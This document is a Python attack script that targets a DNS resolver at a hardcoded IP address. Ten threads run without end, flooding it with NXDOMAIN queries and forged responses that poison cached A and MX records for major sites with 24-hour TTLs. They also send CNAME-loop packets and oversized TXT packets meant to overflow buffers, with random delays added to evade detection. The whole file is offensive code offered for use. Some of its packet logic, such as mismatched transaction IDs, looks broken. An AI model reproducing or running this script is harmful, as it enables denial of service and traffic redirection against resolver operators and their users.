import socket
import struct
import random
import threading
import time
from collections import defaultdict

router_ip = "62.109.121.43"  # Change to target IP
DNS_PORT = 53

# Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
BLUE = '\033[94m'
RESET = '\033[0m'

# Poison statistics
poison_stats = defaultdict(int)
lock = threading.Lock()

def build_query(domain, qtype=1, qclass=1):
    """Build DNS query"""
    trans_id = random.randint(0, 65535)
    flags = 0x0100  # Standard query, recursion desired
    header = struct.pack('>HHHHHH', trans_id, flags, 1, 0, 0, 0)
    
    # Question section
    question = b''
    for part in domain.split('.'):
        question += struct.pack('B', len(part)) + part.encode()
    question += b'\x00'  # End of domain
    question += struct.pack('>HH', qtype, qclass)
    
    return header + question, trans_id

def build_poison_response(trans_id, domain, poisoned_ip="127.0.0.1", ttl=86400):
    """Build poisoned DNS response"""
    # Header: Response, Authoritative Answer, Recursion Available
    flags = 0x8180  # Response + Recursion Available
    header = struct.pack('>HHHHHH', trans_id, flags, 1, 1, 0, 0)
    
    # Question section
    question = b''
    for part in domain.split('.'):
        question += struct.pack('B', len(part)) + part.encode()
    question += b'\x00'  # End of domain
    question += struct.pack('>HH', 1, 1)  # A record, IN class
    
    # Answer section - Poisoned record
    answer = b'\xc0\x0c'  # Pointer to domain name in question
    answer += struct.pack('>HHIH', 1, 1, ttl, 4)  # A record, TTL 24h, 4 bytes data
    answer += socket.inet_aton(poisoned_ip)  # Malicious IP
    
    return header + question + answer

def nxdomain_bomb(target_ip, domain):
    """Send NXDOMAIN queries to waste resolver resources"""
    query, trans_id = build_query(domain)
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(0.1)
    
    # Send multiple queries rapidly
    for _ in range(10):
        sock.sendto(query, (target_ip, DNS_PORT))
        with lock:
            poison_stats['nxdomain'] += 1
        time.sleep(0.001)
    
    sock.close()
    return trans_id

def inject_poison_record(target_ip, domain, poisoned_ip="0.0.0.0"):
    """Inject poisoned A record into cache"""
    trans_id = random.randint(0, 65535)
    
    # First send query
    query, _ = build_query(domain)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(query, (target_ip, DNS_PORT))
    
    # Immediately send poisoned response (simulating cache poisoning)
    response = build_poison_response(trans_id, domain, poisoned_ip, ttl=86400)
    sock.sendto(response, (target_ip, DNS_PORT))
    
    sock.close()
    with lock:
        poison_stats['poison_injected'] += 1
    
    return True

def cname_chain_attack(target_ip, base_domain):
    """Create infinite CNAME redirection chain"""
    # Build malicious CNAME response
    trans_id = random.randint(0, 65535)
    
    header = struct.pack('>HHHHHH', trans_id, 0x8180, 1, 2, 0, 0)
    
    # Question
    question = b''
    for part in base_domain.split('.'):
        question += struct.pack('B', len(part)) + part.encode()
    question += b'\x00\x00\x05\x00\x01'  # CNAME record
    
    # Answer 1: domain -> sub1.domain
    answer1 = b'\xc0\x0c\x00\x05\x00\x01\x00\x00\x0e\x10\x00\x0f'
    answer1 += b'\x04sub1' + b'\xc0\x0c'  # Pointer to original domain
    
    # Answer 2: sub1.domain -> sub2.domain (creates loop)
    answer2 = b'\xc0\x1c\x00\x05\x00\x01\x00\x00\x0e\x10\x00\x0f'
    answer2 += b'\x04sub2' + b'\xc0\x0c'
    
    packet = header + question + answer1 + answer2
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(packet, (target_ip, DNS_PORT))
    sock.close()
    
    with lock:
        poison_stats['cname_chains'] += 1

def mx_record_poison(target_ip, domain, mail_server="0.0.0.0"):
    """Poison MX records to break email"""
    trans_id = random.randint(0, 65535)
    
    # Query for MX record
    query, _ = build_query(domain, qtype=15)  # MX type
    
    header = struct.pack('>HHHHHH', trans_id, 0x8180, 1, 1, 0, 0)
    
    # Question
    question = b''
    for part in domain.split('.'):
        question += struct.pack('B', len(part)) + part.encode()
    question += b'\x00\x00\x0f\x00\x01'  # MX record
    
    # Poisoned MX answer
    answer = b'\xc0\x0c\x00\x0f\x00\x01\x00\x00\x0e\x10\x00\x09'
    answer += b'\x00\x0a'  # Preference 10
    answer += b'\x07mailserver\x03com\x00'
    
    packet = header + question + answer
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(query, (target_ip, DNS_PORT))
    time.sleep(0.01)
    sock.sendto(packet, (target_ip, DNS_PORT))
    sock.close()
    
    with lock:
        poison_stats['mx_poisoned'] += 1

def txt_record_bomb(target_ip, domain):
    """Send massive TXT record to overflow buffers"""
    trans_id = random.randint(0, 65535)
    
    header = struct.pack('>HHHHHH', trans_id, 0x8180, 1, 1, 0, 0)
    
    # Question
    question = b''
    for part in domain.split('.'):
        question += struct.pack('B', len(part)) + part.encode()
    question += b'\x00\x00\x10\x00\x01'  # TXT record
    
    # Massive TXT data (near 64KB limit)
    txt_data = b'X' * 50000  # 50KB of data
    
    answer = b'\xc0\x0c\x00\x10\x00\x01\x00\x00\x00\x3c'
    answer += struct.pack('>H', len(txt_data) + 1)
    answer += struct.pack('B', len(txt_data)) + txt_data
    
    packet = header + question + answer
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(packet, (target_ip, DNS_PORT))
    sock.close()
    
    with lock:
        poison_stats['txt_bombs'] += 1

def attack_thread():
    """Main attack thread - runs all poison methods"""
    domains = [
        "google.com", "facebook.com", "youtube.com", "amazon.com",
        "microsoft.com", "apple.com", "netflix.com", "twitter.com"
    ]
    
    malicious_ips = ["0.0.0.0", "127.0.0.1", "10.0.0.1", "192.168.1.1"]
    
    while True:
        domain = random.choice(domains)
        poisoned_ip = random.choice(malicious_ips)
        
        # Randomly select attack method
        method = random.randint(1, 5)
        
        try:
            if method == 1:
                nxdomain_bomb(router_ip, domain)
            elif method == 2:
                inject_poison_record(router_ip, domain, poisoned_ip)
            elif method == 3:
                cname_chain_attack(router_ip, domain)
            elif method == 4:
                mx_record_poison(router_ip, domain)
            elif method == 5:
                txt_record_bomb(router_ip, domain)
        except:
            pass
        
        # Random delay to avoid pattern
        time.sleep(random.uniform(0.01, 0.5))

def status_monitor():
    """Display poison statistics"""
    last_print = time.time()
    
    while True:
        time.sleep(1)
        
        if time.time() - last_print >= 5:
            with lock:
                total = sum(poison_stats.values())
                
                print(f"\n{MAGENTA}╔══════════════════════════════════════╗{RESET}")
                print(f"{MAGENTA}║        {CYAN}DNS-POISON ACTIVE{RESET} {MAGENTA}       ║{RESET}")
                print(f"{MAGENTA}╠══════════════════════════════════════╣{RESET}")
                print(f"{MAGENTA}║{RESET} Target: {RED}{router_ip:29}{RESET}{MAGENTA}║{RESET}")
                print(f"{MAGENTA}║{RESET} Total Attacks: {GREEN}{total:20}{RESET}{MAGENTA}║{RESET}")
                print(f"{MAGENTA}╠══════════════════════════════════════╣{RESET}")
                print(f"{MAGENTA}║{RESET} NXDOMAIN Bombs: {YELLOW}{poison_stats['nxdomain']:18}{RESET}{MAGENTA}║{RESET}")
                print(f"{MAGENTA}║{RESET} Poison Injected: {RED}{poison_stats['poison_injected']:18}{RESET}{MAGENTA}║{RESET}")
                print(f"{MAGENTA}║{RESET} CNAME Chains: {BLUE}{poison_stats['cname_chains']:20}{RESET}{MAGENTA}║{RESET}")
                print(f"{MAGENTA}║{RESET} MX Poisoned: {CYAN}{poison_stats['mx_poisoned']:21}{RESET}{MAGENTA}║{RESET}")
                print(f"{MAGENTA}║{RESET} TXT Bombs: {GREEN}{poison_stats['txt_bombs']:23}{RESET}{MAGENTA}║{RESET}")
                print(f"{MAGENTA}╚══════════════════════════════════════╝{RESET}")
                print()
            
            last_print = time.time()

# Start attack
print(f"{RED}STARTING DNS-POISON ATTACK{RESET}")
print(f"{YELLOW}Target: {router_ip}{RESET}")
print(f"{CYAN}Goal: Poison DNS cache with long TTL records{RESET}")
print()

# Start 10 attack threads
for _ in range(10):
    threading.Thread(target=attack_thread, daemon=True).start()

# Start monitor
threading.Thread(target=status_monitor, daemon=True).start()

# Keep main thread alive
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print(f"\n{RED}DNS-POISON stopped.{RESET}")
    print(f"{YELLOW}Poisoned records may persist for 24h+{RESET}")
